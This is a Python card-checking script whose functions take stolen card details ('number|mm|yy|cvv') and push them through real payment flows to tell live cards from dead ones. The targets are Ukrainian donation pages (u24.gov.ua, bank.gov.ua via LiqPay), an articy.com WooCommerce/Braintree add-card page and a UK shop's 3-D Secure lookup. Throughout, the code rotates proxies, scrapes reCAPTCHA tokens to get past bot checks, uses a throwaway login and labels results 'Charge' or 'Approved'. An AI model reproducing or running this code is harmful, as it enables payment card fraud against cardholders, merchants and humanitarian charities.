	    return 'Declined'
def idkhow(card33):
	import requests,random
	card33=card33.strip()
	n = card33.split("|")[0]
	mm = card33.split("|")[1]
	yy = card33.split("|")[2]
	cvc = card33.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	coder = requests.session()
	with open("coder.txt", "r") as f:
		lines = f.read().splitlines()
	selected = random.choice(lines)
	host, port = selected.strip().split(":")
	proxy_auth = f"{host}:{port}"
	proxies = {
	    "http": f"http://{proxy_auth}",
	    "https": f"http://{proxy_auth}",
	}
	headers = {
    'Origin': 'https://u24.gov.ua',
    'Referer': 'https://u24.gov.ua/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	response = coder.get('https://u24.gov.ua/main-es2015.84b5ad88cc9c73c36b1e.js', headers=headers, proxies=proxies)
	client_secret = re.search(r'ugb:{widgetGenericKey:"(.*?)"', response.text).group(1)
	###################
	headers = {
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'content-type': 'application/json',
	    'origin': 'https://u24.gov.ua',
	    'priority': 'u=1, i',
	    'referer': 'https://u24.gov.ua/',
	    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	json_data = {
	    'key': client_secret,
	    'location': 'https://u24.gov.ua/',
	    'host': 'u24.gov.ua',
	}
	response = coder.post('https://ecom.ukrgasbank.com/api/v1/widget', headers=headers, json=json_data, proxies=proxies)
	ssid = re.search(r'"ssid":"(.*?)"', response.text).group(1)
	#print(ssid)
	time.sleep(5)
	######################
	headers = {
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://widget.cp.ukrgasbank.com',
	    'priority': 'u=1, i',
	    'referer': 'https://widget.cp.ukrgasbank.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
	}
	
	json_data = {
	    'ssid': ssid,
	    'card_number': n,
	    'card_exp_month': mm,
	    'card_exp_year': yy,
	    'card_cvv': cvc,
	}
	
	response = requests.post('https://ecom.ukrgasbank.com/api/v1/token/card', headers=headers, json=json_data, proxies=proxies)
	token = re.search(r'"token":"(.*?)"', response.text).group(1)
	#print(token)
	##########################
	headers_get = {
	        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
	        "Pragma": "no-cache",
	        "Accept": "*/*"
	    }
	url_get = "https://www.google.com/recaptcha/api2/anchor"
	params_get = {
	        "ar": "1",
	        "k": "6LeO0mUfAAAAAFeZmGNtHbUaUn1bGrbAhxMnxY3A",
	        "co": "aHR0cHM6Ly91MjQuZ292LnVhOjQ0Mw..",
	        "hl": "en",
	        "v": "GUGrl5YkSwpBsxsF3eY665Ye",
	        "size": "invisible",
	        "cb": "3f0ix3e46u0e"
	}
	response_get = requests.get(url_get, headers=headers_get, params=params_get)
	source_html = response_get.text
	token_match = re.search(r'type="hidden" id="recaptcha-token" value="(.*?)"', source_html)
	tk = token_match.group(1)
	headers_post = {
	        "User-Agent": headers_get["User-Agent"],
	        "Pragma": "no-cache",
	        "Accept": "*/*",
	        "accept-encoding": "gzip, deflate, br",
	        "accept-language": "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
	        "origin": "https://www.google.com",
	        "sec-fetch-dest": "empty",
	        "sec-fetch-mode": "cors",
	        "sec-fetch-site": "same-origin"
	    }
	url_post = "https://www.google.com/recaptcha/api2/reload?k=6LeO0mUfAAAAAFeZmGNtHbUaUn1bGrbAhxMnxY3A"
	payload = {
	        "v": "GUGrl5YkSwpBsxsF3eY665Ye",
	        "reason": "q",
	        "c": tk,
	        "k": "6LeO0mUfAAAAAFeZmGNtHbUaUn1bGrbAhxMnxY3A",
	        "co": "aHR0cHM6Ly91MjQuZ292LnVhOjQ0Mw..",
	        "hl": "en",
	        "size": "invisible",
	    }
	response_post = requests.post(url_post, headers=headers_post, data=payload)
	source_post = response_post.text
	tr_match = re.search(r'\["rresp","(.*?)"\]', source_post)
	tr = tr_match.group(1) if tr_match else None
	text = f"""{tr}"""
	split_marker = '",nul'
	index = text.find(split_marker)
	if index != -1:
	    result = text[:index]
	else:
	    result = text
	##########################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://u24.gov.ua',
	    'referer': 'https://u24.gov.ua/result/error',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	json_data = {
	    'amount': '1.00',
	    'amountFee': '0.02',
	    'currency': 'usd',
	    'token': token,
	    'lang': 'en',
	    'direction': 'defend',
	    'browserFingerprint': {
	        'browserColorDepth': 24,
	        'browserScreenHeight': 1024,
	        'browserScreenWidth': 1280,
	        'browserJavaEnabled': False,
	        'browserLanguage': 'en-US',
	        'browserTimeZone': 'Africa/Cairo',
	        'browserTimeZoneOffset': -180,
	        'browserUserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	    },
	    'payway': '',
	    'email': '',
	    'contestType': None,
	    'recaptcha': result,
	}
	response = coder.post('https://u24.gov.ua/api/invoice/ugb/create/direct', headers=headers, json=json_data, proxies=proxies, timeout=60)
	msg = re.search(r'"status_description":"(.*?)"', response.text).group(1)
	#print(response.text)
	if re.search(r'"status":"(success|succeed|succeeded)"', response.text):
	    return 'Charge'
	else:
	    return msg
def idkhoww(card333):
	card333=card333.strip()
	n = card333.split("|")[0]
	mm = card333.split("|")[1]
	yy = card333.split("|")[2]
	cvc = card333.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	coder = requests.session()
	corr = str(uuid.uuid4())
	corrr = corr
	########################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	response = coder.get('https://www.articy.com/shop/shop/my-account/', headers=headers)
	nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1)
	########################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://www.articy.com',
	    'referer': 'https://www.articy.com/shop/shop/my-account/',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	data = {
	    'username': '68eda92272@emaily.pro',
	    'password': '68eda92272@emaily.pro',
	    'woocommerce-login-nonce': nonce,
	    '_wp_http_referer': '/shop/shop/my-account/',
	    'login': 'Log in',
	}
	response = coder.post('https://www.articy.com/shop/shop/my-account/', headers=headers, data=data)
	###########################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	response = coder.get('https://www.articy.com/shop/shop/my-account/add-payment-method/', headers=headers)
	noncee = re.search(r'"credit_card","client_token_nonce":"(.*?)"', response.text).group(1)
	payment_method_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	##########################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://www.articy.com',
	    'referer': 'https://www.articy.com/shop/shop/my-account/add-payment-method/',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	data = {
	    'action': 'wc_braintree_credit_card_get_client_token',
	    'nonce': noncee,
	}
	response = coder.post('https://www.articy.com/shop/wp-admin/admin-ajax.php', headers=headers, data=data)
	response1 = response.text
	data = json.loads(response1)
	token = data.get("data")
	missing_padding = len(token) % 4
	token += '=' * (4 - missing_padding)
	decoded = base64.b64decode(token).decode('utf-8')
	decoded_data = json.loads(decoded)
	auth_fingerprint = decoded_data.get("authorizationFingerprint")
	############################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'authorization': f'Bearer {auth_fingerprint}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	response = coder.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok=response.json()['data']['tokenizeCreditCard']['token']
	##############################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://www.articy.com',
	    'referer': 'https://www.articy.com/shop/shop/my-account/add-payment-method/',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	data = [
	    ('payment_method', 'braintree_credit_card'),
	    ('wc-braintree-credit-card-card-type', 'master-card'),
	    ('wc-braintree-credit-card-3d-secure-enabled', ''),
	    ('wc-braintree-credit-card-3d-secure-verified', ''),
	    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
	    ('wc_braintree_credit_card_payment_nonce', tok),
	    ('wc_braintree_device_data', '{"correlation_id":"' + corrr + '"}'),
	    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
	    ('wc_braintree_paypal_payment_nonce', ''),
	    ('wc_braintree_device_data', '{"correlation_id":"' + corrr + '"}'),
	    ('wc_braintree_paypal_amount', '0.00'),
	    ('wc_braintree_paypal_currency', 'EUR'),
	    ('wc_braintree_paypal_locale', 'en_us'),
	    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
	    ('woocommerce-add-payment-method-nonce', payment_method_nonce),
	    ('_wp_http_referer', '/shop/shop/my-account/add-payment-method/'),
	    ('woocommerce_add_payment_method', '1'),
	]
	response = coder.post(
	    'https://www.articy.com/shop/shop/my-account/add-payment-method/',
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'<ul class="woocommerce-error" role="alert">.*?<li>\s*(.*?)\s*</li>.*?</ul>'  
	match = re.search(pattern, text, re.DOTALL)
	if match:
		last = match.group(1).strip()
		if 'risk_threshold' in last:
			return 'RISK: Retry this BIN later.'
		elif 'Nice! New payment method added' in last or 'Payment method successfully added.' in last:
			return 'Approved'
		elif 'Duplicate card exists in the vault.' in text:
			return 'Approved'
		elif 'Cannot Authorize at this time (Policy) (51 : TRY AGAIN LATER)' in last:
			return 'Cannot Authorize at this time (Policy)'
		elif 'Cannot Authorize at this time (Policy) (51 : NEW ACCOUNT INFO)' in last:
			return 'Cannot Authorize at this time (Policy)'
		elif 'Cannot Authorize at this time (Life cycle) (51 : TRY AGAIN LATER)' in last:
			return 'Cannot Authorize at this time (Life cycle)'
		elif 'Declined (51 : DECLINED)' in last:
			return 'Declined'
		elif 'Declined - Call Issuer (51 : DO NOT TRY AGAIN)' in last:
			return 'Declined - Call Issuer'
		elif 'Processor Declined (14 : INV ACCT NUM)' in last:
			return 'Processor Declined'
		elif "Card Issuer Declined CVV" in last:
			return 'Approved (CCN)'
		else:
			return last
	else:
		return 'Erroooooooor'
def idkhowww(card3333):
	card3333=card3333.strip()
	n = card3333.split("|")[0]
	mm = card3333.split("|")[1]
	yy = card3333.split("|")[2]
	cvc = card3333.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	coder = requests.session()
	corr = str(uuid.uuid4())
	corrr = corr
	with open("coder.txt", "r") as f:
		lines = f.read().splitlines()
	selected = random.choice(lines)
	host, port, username, password = selected.strip().split(":")
	proxy_auth = f"{username}:{password}@{host}:{port}"
	proxies = {
	    "http": f"http://{proxy_auth}",
	    "https": f"http://{proxy_auth}",
	}
	########################
	headers = {
	    'Referer': 'https://bank.gov.ua/en/news/all/natsionalniy-bank-vidkriv-rahunok-dlya-gumanitarnoyi-dopomogi-ukrayintsyam-postrajdalim-vid-rosiyskoyi-agresiyi',
	    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	response = coder.get('https://bank.gov.ua/frontend/content/gum_frame_en.html', headers=headers, proxies=proxies, timeout=60)
	data = re.search(r'data: "(.*?)"', response.text).group(1)
	signature = re.search(r'signature: "(.*?)"', response.text).group(1)
	###################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://www.liqpay.ua',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	data = {
	    'data': data,
	    'signature': signature,
	    'language': 'en',
	    'isWidget': 'true',
	    'widgetMode': 'embed',
	    'widget': 'checkoutjs',
	    'browserScreenWidth': '1280',
	    'browserScreenHeight': '984',
	}
	response = coder.post('https://www.liqpay.ua/apiweb/checkout/init/api', headers=headers, data=data, proxies=proxies, timeout=60)
	key = re.search(r'"token":"(.*?)"', response.text).group(1)
	order_id = re.search(r'"order_id":"(.*?)"', response.text).group(1)
	pagetoken = re.search(r'"pagetoken":"(.*?)"', response.text).group(1)
	uid = re.search(r'"uid":"(.*?)"', response.text).group(1)
	########
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://www.liqpay.ua',
	    'referer': f'https://www.liqpay.ua/en/checkout/card/{key}',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	params = {
	    '_order_id': order_id,
	}
	data = {
	    'token': key,
	    'amount': '0.01',
	    'currency': 'USD',
	    'description': 'Humanitarian Assistance to Ukrainians',
	    'widget': 'checkoutjs',
	    'checkouttoken': key,
	    'pagetoken': pagetoken,
	    'language': 'en',
	    'uid': uid,
	    'browserScreenWidth': '1280',
	    'browserScreenHeight': '984',
	}
	response = coder.post('https://www.liqpay.ua/apiweb/checkout/change/amount', params=params, headers=headers, data=data, proxies=proxies, timeout=60)
	##############
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://www.liqpay.ua',
	    'referer': f'https://www.liqpay.ua/en/checkout/card/{key}',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	params = {
	    '_order_id': order_id,
	}
	data = {
	    'paytype': 'card',
	    'card': n,
	    'last_name': 'Coder',
	    'first_name': 'Baba',
	    'card_exp_month': mm,
	    'card_exp_year': yy,
	    'card_cvv': cvc,
	    'token': key,
	    'prepare': '0',
	    'async': 'yes',
	    'widget': 'checkoutjs',
	    'checkouttoken': key,
	    'pagetoken': pagetoken,
	    'language': 'en',
	    'uid': uid,
	    'browserScreenWidth': '1280',
	    'browserScreenHeight': '984',
	}
	response = coder.post('https://www.liqpay.ua/apiweb/checkout/prepare', params=params, headers=headers, data=data, proxies=proxies, timeout=60)
	##############
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://www.liqpay.ua',
	    'referer': f'https://www.liqpay.ua/en/checkout/card/{key}',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	params = {
	    '_order_id': order_id,
	}
	data = {
	    'token': key,
	    'widget': 'checkoutjs',
	    'checkouttoken': key,
	    'pagetoken': pagetoken,
	    'language': 'en',
	    'uid': uid,
	    'browserScreenWidth': '1280',
	    'browserScreenHeight': '984',
	}
	response = coder.post('https://www.liqpay.ua/apiweb/checkout/status', params=params, headers=headers, data=data, proxies=proxies, timeout=60)
	#print(response.text)
	if re.search(r'"status":"(success|succeed|succeeded|successfully|successful|completed|complete|true)"', response.text):
	    return 'Charge'
	else:
	    return 'Declined'
def vbb(ccx):
	import requests,re,base64,jwt,json
	def getstr(text: str, a: str, b: str) -> str:
	    try:
	        return text.split(a)[1].split(b)[0]
	    except IndexError:
	        return None
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvv = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r =requests.session()
	from user_agent import generate_user_agent
	user = generate_user_agent()
	session =requests.session()
	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer': 'https://www.theplasticshop.co.uk/search.php?mode=search&page=1&keep_https=yes',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
	response = session.get(
    'https://www.theplasticshop.co.uk/acrylic-tube-extruded-clear-5mm-od-to-7mm-od.html',
    headers=headers,
)
	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.theplasticshop.co.uk',
    'referer': 'https://www.theplasticshop.co.uk/acrylic-tube-extruded-clear-5mm-od-to-7mm-od.html',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
	data = {
    'mode': 'add',
    'productid': '3412',
    'cat': '',
    'page': '',
    'tps_options[calculator]': 'Y',
    'tps_options[diameter]': '1186',
    'tps_options[colour]': '2299',
    'tps_options[length]': '2589',
    'tps_options[custom_length]': '',
    'tps_options[custom_width]': '',
    'price': '14.38',
    'amount': '1',
}
	response = session.post('https://www.theplasticshop.co.uk/cart.php', headers=headers, data=data)
	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer': 'https://www.theplasticshop.co.uk/cart.php',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
	params = {
    'mode': 'checkout',
}
	response = session.get('https://www.theplasticshop.co.uk/cart.php', params=params, headers=headers)
	cartid = getstr(response.text, '"entity_id":"', '"')
	b_token_encrypted = getstr(response.text, 'token: "', '"')
	b_token_decrypted = str(base64.b64decode(b_token_encrypted))
	btoken = getstr(b_token_decrypted, '"authorizationFingerprint":"', '","')
	merchantId = getstr(b_token_decrypted, 'merchantId":"', '","')
	b_token = "Bearer "+btoken
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': b_token,
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://www.theplasticshop.co.uk',
    'referer': 'https://www.theplasticshop.co.uk/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': str(uuid.uuid4()),
    },
    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
    'operationName': 'ClientConfiguration',
}
	response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	cardnal = getstr(response.text,'cardinalAuthenticationJWT":"','"')
	headers = {
    'authority': 'centinelapi.cardinalcommerce.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://www.theplasticshop.co.uk',
    'referer': 'https://www.theplasticshop.co.uk/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'x-cardinal-tid': 'Tid-70fc57f4-8854-4922-9942-ff839a95edaf',
}
	json_data = {
    'BrowserPayload': {
        'Order': {
            'OrderDetails': {},
            'Consumer': {
                'BillingAddress': {},
                'ShippingAddress': {},
                'Account': {},
            },
            'Cart': [],
            'Token': {},
            'Authorization': {},
            'Options': {},
            'CCAExtension': {},
        },
        'SupportsAlternativePayments': {
            'cca': True,
            'hostedFields': False,
            'applepay': False,
            'discoverwallet': False,
            'wallet': False,
            'paypal': False,
            'visacheckout': False,
        },
    },
    'Client': {
        'Agent': 'SongbirdJS',
        'Version': '1.35.0',
    },
    'ConsumerSessionId': None,
    'ServerJWT': cardnal,
}
	response = session.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
	payload = getstr(response.text,'CardinalJWT":"','"')
	payload_dict = jwt.decode(payload, options={"verify_signature": False})
	reference_id = payload_dict['ReferenceId']
	headers = {
    'authority': 'geo.cardinalcommerce.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://geo.cardinalcommerce.com',
    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=603ed7fe67e03415bdda2aa8&tmEventType=PAYMENT&referenceId=0_c562be23-7dec-43e8-831a-daed4d65a381&geolocation=false&origin=Songbird',    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
	json_data = {
    'Cookies': {
        'Legacy': True,
        'LocalStorage': True,
        'SessionStorage': True,
    },
    'DeviceChannel': 'Browser',
    'Extended': {
        'Browser': {
            'Adblock': True,
            'AvailableJsFonts': [],
            'DoNotTrack': 'unknown',
            'JavaEnabled': False,
        },
        'Device': {
            'ColorDepth': 24,
            'Cpu': 'unknown',
            'Platform': 'Linux armv81',
            'TouchSupport': {
                'MaxTouchPoints': 5,
                'OnTouchStartAvailable': True,
                'TouchEventCreationSuccessful': True,
            },
        },
    },
    'Fingerprint': '1965c9ede0e3aef70fa3be6a4ed0c8e7',
    'FingerprintingTime': 853,
    'FingerprintDetails': {
        'Version': '1.5.1',
    },
    'Language': 'ar-US',
    'Latitude': None,
    'Longitude': None,
    'OrgUnitId': '603ed7fe67e03415bdda2aa8',
    'Origin': 'Songbird',
    'Plugins': [],
    'ReferenceId': reference_id,
    'Referrer': 'https://www.theplasticshop.co.uk/',
    'Screen': {
        'FakedResolution': False,
        'Ratio': 2.2216981132075473,
        'Resolution': '942x424',
        'UsableResolution': '942x424',
        'CCAScreenSize': '02',
    },
    'CallSignEnabled': None,
    'ThreatMetrixEnabled': False,
    'ThreatMetrixEventType': 'PAYMENT',
    'ThreatMetrixAlias': 'Default',
    'TimeOffset': -180,
    'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'UserAgentDetails': {
        'FakedOS': False,
        'FakedBrowser': False,
    },
    'BinSessionId': '98058e22-1d24-4c22-a025-d4eb0ab6295d',
}

	response = session.post(
    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
    headers=headers,
    json=json_data,
)
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': b_token,
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': str(uuid.uuid4()),
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvv,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
	response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	token_bc = getstr(response.text, '"token":"', '"')
	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://www.theplasticshop.co.uk',
    'referer': 'https://www.theplasticshop.co.uk/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
	json_data = {
    'amount': 29.26,
    'additionalInfo': {
        'workPhoneNumber': '',
        'shippingGivenName': None,
        'shippingSurname': None,
        'shippingPhone': None,
        'acsWindowSize': '03',
        'billingCity': None,
        'billingState': None,
        'billingPostalCode': None,
        'billingCountryCode': None,
        'billingPhoneNumber': None,
        'billingGivenName': None,
        'billingSurname': None,
        'shippingCity': None,
        'shippingState': None,
        'shippingPostalCode': None,
        'shippingCountryCode': None,
    },
    'challengeRequested': 'true',
    'dfReferenceId': reference_id,
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.92.1',
        'cardinalDeviceDataCollectionTimeElapsed': 2122,
        'issuerDeviceDataCollectionTimeElapsed': 576,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': btoken,
    'braintreeLibraryVersion': 'braintree/web/3.92.1',
    '_meta': {
        'merchantAppId': 'www.theplasticshop.co.uk',
        'platform': 'web',
        'sdkVersion': '3.92.1',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': str(uuid.uuid4()),
    },
}
	response = session.post(
    f'https://api.braintreegateway.com/merchants/gmspjzxqc96pfnct/client_api/v1/payment_methods/{token_bc}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)
	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	if 'authenticate_successful' in vbv:
	       return '3DS Authenticate Successful '
